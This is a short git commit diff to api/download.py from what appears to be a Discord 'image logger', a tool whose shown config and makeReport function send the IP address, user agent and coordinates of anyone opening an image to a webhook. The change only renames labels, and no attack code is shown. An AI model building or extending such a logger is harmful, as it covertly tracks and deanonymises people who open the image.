e237428c4f757da85994e1202eb4ea113a763fb4
Nivgab <122238555+Nivgab@users.noreply.github.com>
2023-06-16 21:50:11 +0300

    Update download.py

--- api/download.py
+++ api/download.py
@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Download Logger", # Set this to the name you want the webhook to have
+    "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Discord Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
